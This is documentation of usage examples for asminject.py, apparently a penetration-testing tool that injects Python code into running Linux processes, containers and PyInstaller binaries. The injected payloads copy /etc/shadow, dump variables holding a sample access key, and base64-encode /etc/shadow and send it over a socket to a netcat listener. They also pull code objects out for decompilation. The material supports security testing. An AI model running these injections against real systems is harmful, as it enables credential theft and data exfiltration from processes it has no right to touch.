# asminject.py examples - Python
* [Execute arbitrary Python code inside an existing Python process](#execute-arbitrary-python-code-inside-an-existing-python-process)
* [Write all global or variables to standard out](#write-all-global-or-local-variables-to-standard-out)
* [Interact with a container only via injected Python code](#interact-with-a-container-only-via-injected-python-code)
* [Execute arbitrary Python code inside a PyInstaller-Compiled Binary Process](#execute-arbitrary-python-code-inside-a-pyinstaller-compiled-binary-process)

## Important

For all Python 3 examples, refer to the <a href="docs/specialized_options.md#specifying-non-pic-code">position-independent code discussion in the specialized options document</a>. Python 3 before 3.10 is usually not position-independent, but Python 3.10 and later usually are.

## Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data. This example uses Python 3, but the syntax for `asminject.py` is identical for Python 2 target processes, although of course you'd need to specify script code that's valid in Python 2.

```
$ sudo python3 practice/python_loop.py

2022-05-12T19:46:46.245462 - Loop count 0
2022-05-12T19:46:51.253640 - Loop count 1
2022-05-12T19:46:56.264897 - Loop count 2
```

In a separate terminal, locate the process and inject some arbitrary Python code into it. 

This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.

```
# python3 ./asminject.py 2037475 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
   
...omitted for brevity...
```

Verify that the file has been copied:

```
# cat /tmp/bishopfox.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Write all global or local variables to standard out

Use [the following Python 3 code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/633127/viewing-all-defined-variables)

Global variables:

```
tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
```


Local variables:

```
tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
```

e.g. for global variables:

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

or for local variables:

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

Example output:

```
2022-06-09T23:08:56.301925 - Loop count 107
time   :   <module 'time' (built-in)>  type: <class 'module'>
datetime   :   <module 'datetime' from '/usr/lib/python3.9/datetime.py'>  type: <class 'module'>
example_global_var_1   :   AKIASADF9370235SUAS0  type: <class 'str'>
example_global_var_2   :   This value should not be disclosed  type: <class 'str'>
i   :   107  type: <class 'int'>
v   :   time  type: <class 'str'>
2022-06-09T23:09:05.310443 - Loop count 108
```

## Interact with a container only via injected Python code

This scenario simulates a container that either does not allow access to an interactive shell, or use of the interactive shell would trigger an unwanted response.

Start a Python 3 process in a Docker container:
```
# docker run -v $(pwd)/practice/python_loop.py:/tmp/python_loop.py \
   --network=host -ti fedora

latest: Pulling from library/fedora
e1deda52ffad: Pull complete 
...omitted for brevity...
[root@3a78fa62ff5b /]# python3 /tmp/python_loop.py 
2022-06-29T21:30:19.037816 - Loop count 0
2022-06-29T21:30:24.043250 - Loop count 1
```

Locate the process ID for the Python process, then get a list of the binaries it has loaded:

```
# ps auxww | grep python                  

...omitted for brevity...
root     2378331  [...] python3 /tmp/python_loop.py

# cat /proc/2378331/maps

556d84513000-556d84514000 r--p [...] /usr/bin/python3.10
...omitted for brevity...
7f8483e8b000-7f8483ee4000 r--p [...] /usr/lib64/libpython3.10.so.1.0
...omitted for brevity...
```

Copy any necessary binaries out of the container and generate offsets from them. For example:

```
# docker cp 3a78fa62ff5b:/usr/bin/python3.10 ./docker-fedora-python3.10

# docker cp 3a78fa62ff5b:/usr/lib64/libpython3.10.so.1.0 ./docker-fedora-libpython3.10

# ./get_relative_offsets.sh docker-fedora-python3.10 > relative-offsets-docker-fedora-python3.10.txt

# ./get_relative_offsets.sh docker-fedora-libpython3.10 > relative-offsets-docker-fedora-libpython3.10.txt
```

Inject the Python code into the target process using the `execute_python_code.s` payload, e.g.:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
	--relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
	--relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
	--var pythoncode 'import os; print(os.environ);'
```

This should generate output in the terminal where the container was launched, e.g.:

```
2022-06-29T21:53:35.027900 - Loop count 278
environ({'HOSTNAME': '3a78fa62ff5b', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'})
2022-06-29T21:53:44.063159 - Loop count 279
```

To simulate a situation where the console is not visible, you can send Python code that will return the output to a TCP listener, e.g.:

```
% nc -nvlkp 7777
listening on [any] 7777 ...
```

Then, in another terminal:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
```

You should see the output in the `nc` listener, e.g.:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45528
environ({'HOSTNAME': 'copyroom', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'}
```

Copy a file out of the container:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
```

The base64-encoded version should appear in the netcat listener:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45530
cm9vdDohbG9ja2VkOjowOjk5O...omitted for brevity...
```

## Execute arbitrary Python code inside a PyInstaller-Compiled Binary Process

Simulate someone converting their human-readable Python scripts into a binary that is more difficult to analyze, then launch that binary:

```
# cd practice
# pyinstaller python_loop.py

418 INFO: PyInstaller: 5.3
418 INFO: Python: 3.10.5
422 INFO: Platform: Linux-5.18.0-kali2-amd64-x86_64-with-glibc2.33
...omitted for brevity...
5368 INFO: Building COLLECT COLLECT-00.toc
6013 INFO: Building COLLECT COLLECT-00.toc completed successfully.

# file dist/python_loop/python_loop

dist/python_loop/python_loop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9230f3fa19123436d7e9b46b02c11f1e492895c1, for GNU/Linux 2.6.32, stripped

# dist/python_loop/python_loop

2022-09-09T00:50:08.907011 - Loop count 0
2022-09-09T00:50:33.419231 - Loop count 1
```

In a separate terminal, locate the process and inject code into it just like it was a regular Python process:

```
# ps auxww | grep python_loop                                                                                              

user      153818  [...] dist/python_loop/python_loop


# python3 ./asminject.py 153818 execute_python_code.s \
	--relative-offsets-from-binaries \
	--var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

Example output for dumping global variables:

```
2022-09-09T00:53:08.653563 - Loop count 32
...omitted for brevity...
__loader__   :   <pyimod02_importers.FrozenImporter object at 0x7f6af5260880>  type: <class 'pyimod02_importers.FrozenImporter'>
...omitted for brevity...
os   :   <module 'os' from '/[REDACTED]/practice/dist/python_loop/base_library.zip/os.pyc'>  type: <class 'module'>
...omitted for brevity...
inspect   :   <module 'inspect' from '/[REDACTED]/practice/dist/python_loop/inspect.pyc'>  type: <class 'module'>
...omitted for brevity...
example_global_var_1   :   AKIASADF9370235SUAS0  type: <class 'str'>
example_global_var_2   :   This value should not be disclosed  type: <class 'str'>
i   :   32  type: <class 'int'>
2022-09-09T00:53:17.745785 - Loop count 33
```

That's pretty neat, but what if one wants to find out more about the code?

```
# python3 ./asminject.py 153818 execute_python_code.s \
	--relative-offsets-from-binaries \
	--var pythoncode 'for name, obj in inspect.getmembers(sys.modules[__name__]):\n    print(f\"{name}\\t{obj}\");'
```

```
2022-09-09T01:27:25.327239 - Loop count 201
...omitted for brevity...
__file__	/[REDACTED]practice/dist/python_loop/python_loop.py
__loader__	<pyimod02_importers.FrozenImporter object at 0x7f2078888880>
__name__	__main__
...omitted for brevity...
_pyi_main_co	<code object <module> at 0x7f20788a33c0, file "python_loop.py", line 1>
...omitted for brevity...
example_global_var_1	AKIASADF9370235SUAS0
example_global_var_2	This value should not be disclosed
i	201
...omitted for brevity...
2022-09-09T01:27:33.372971 - Loop count 202
```

How about retrieving decompiled source code for the main script by injecting Python code that marshals code objects to disk, and then running that through [Decompyle++](https://github.com/zrax/pycdc)?

```
# python3 ./asminject.py 153818 execute_python_code.s \
	--relative-offsets-from-binaries \
	--var pythoncode 'import marshal\nobj_counter = 0\nfor name, obj in inspect.getmembers(sys.modules[__name__]):\n    obj_counter +=1\n    if name in [\"_pyi_main_co\"]:\n        out_name=os.path.abspath(f\"{obj_counter}-{obj.co_filename}.bin\")\n        print(f\"Writing code object to {out_name}\")\n        with open(out_name, \"wb\") as marshal_file:\n            marshal.dump(obj, marshal_file)'
```

```
...omitted for brevity...
2022-09-09T01:58:11.011195 - Loop count 559
Writing code object to /[REDACTED]/practice/14-python_loop.py.bin
2022-09-09T01:58:20.127165 - Loop count 560
...omitted for brevity...
```

```
pycdc -v 3.10 -c /[REDACTED]/practice/14-python_loop.py.bin
# Source Generated with Decompyle++
# File: 14-python_loop.py.bin (Python 3.10)
...omitted for brevity...
import time
import datetime
example_global_var_1 = 'AKIASADF9370235SUAS0'
example_global_var_2 = 'This value should not be disclosed'
for i in range(0, 1000000):
    print(datetime.datetime.utcnow().isoformat() + ' - Loop count ' + str(i))
    time.sleep(5)
```

What about if one wants to recursively dump all code from all loaded modules?

```
# python3 ./asminject.py 153818 execute_python_code.s \
	--relative-offsets-from-binaries \
	--var pythoncode 'import inspect\nimport marshal\nimport os\nimport sys\n\nobj_counter = 0\niterated_objects = []\n\ndef print_members(o):\n    for name, obj in inspect.getmembers(o):\n        print(f\"{name}\t{obj}\")\n\ndef dump_code_object(code_object, current_path, name):\n    #out_name=(f\"/tmp/marshalled/{obj_counter}-{current_path}-{name}.bin\")\n    out_name=(f\"/tmp/marshalled/{current_path}/{name}.bin\")\n    os.makedirs(os.path.dirname(out_name), exist_ok=True)\n    print(f\"Writing code to {out_name}\")\n    with open(out_name, \"wb\") as marshal_file:\n        marshal.dump(code_object, marshal_file)\n\ndef iteratively_dump_object(o, current_path, d, max_d):\n    global obj_counter\n    global iterated_objects\n    \n    for name, obj in inspect.getmembers(o):\n        obj_path = f\"{current_path}/{name}\"\n        obj_counter +=1\n        obj_to_recurse = None\n        if inspect.iscode(obj) or name in [\"_pyi_main_co\"]:\n            dump_code_object(obj, current_path, name)\n        if inspect.ismodule(obj):\n            #print(f\"Module: {name}\")\n            if name not in iterated_objects:\n                iterated_objects.append(name)\n                obj_to_recurse = obj\n        if inspect.isclass(obj):\n            if name not in [\"__class__\", \"__base__\"]:\n                #print(f\"Class: {name}\")\n                #print_members(obj)\n                obj_to_recurse = obj.__dict__\n        #if inspect.ismethod(obj):\n            #print(f\"Method: {name}\")\n            #print_members(obj)\n            #dump_code_object(obj, current_path, name)\n        if inspect.isfunction(obj):\n            #print(f\"Function: {name}\")\n            #print_members(obj)\n            dump_code_object(obj.__code__, current_path, name)\n        if obj_to_recurse and d < max_d:\n            if obj_path not in iterated_objects:\n                iterated_objects.append(obj_path)\n                iteratively_dump_object(obj, obj_path, d+1, max_d)\n\niteratively_dump_object(sys.modules[__name__], __name__, 0, 10)\nfor sys_module in sys.modules:\n    #print(f\"Module: {sys_module}\")\n    iterated_objects.append(sys_module)\n    iteratively_dump_object(sys.modules.get(sys_module), sys_module, 0, 10)'
```

That is a very ugly rendition of the following script:

```
#!/usr/bin/env python3 

import inspect
import marshal
import os
import sys

obj_counter = 0
iterated_objects = []

def print_members(o):
    for name, obj in inspect.getmembers(o):
        print(f"{name}\t{obj}")

def dump_code_object(code_object, current_path, name):
    #out_name=(f"/tmp/marshalled/{obj_counter}-{current_path}-{name}.bin")
    out_name=(f"/tmp/marshalled/{current_path}/{name}.bin")
    os.makedirs(os.path.dirname(out_name), exist_ok=True)
    print(f"Writing code to {out_name}")
    with open(out_name, "wb") as marshal_file:
        marshal.dump(code_object, marshal_file)

def iteratively_dump_object(o, current_path, d, max_d):
    global obj_counter
    global iterated_objects
    
    for name, obj in inspect.getmembers(o):
        obj_path = f"{current_path}/{name}"
        obj_counter +=1
        obj_to_recurse = None
        if inspect.iscode(obj) or name in ["_pyi_main_co"]:
            dump_code_object(obj, current_path, name)
        if inspect.ismodule(obj):
            #print(f"Module: {name}")
            if name not in iterated_objects:
                iterated_objects.append(name)
                obj_to_recurse = obj
        if inspect.isclass(obj):
            if name not in ["__class__", "__base__"]:
                #print(f"Class: {name}")
                #print_members(obj)
                obj_to_recurse = obj.__dict__
        #if inspect.ismethod(obj):
            #print(f"Method: {name}")
            #print_members(obj)
            #dump_code_object(obj, current_path, name)
        if inspect.isfunction(obj):
            #print(f"Function: {name}")
            #print_members(obj)
            dump_code_object(obj.__code__, current_path, name)
        if obj_to_recurse and d < max_d:
            if obj_path not in iterated_objects:
                iterated_objects.append(obj_path)
                iteratively_dump_object(obj, obj_path, d+1, max_d)

iteratively_dump_object(sys.modules[__name__], __name__, 0, 10)
for sys_module in sys.modules:
    #print(f"Module: {sys_module}")
    iterated_objects.append(sys_module)
    iteratively_dump_object(sys.modules.get(sys_module), sys_module, 0, 10)
```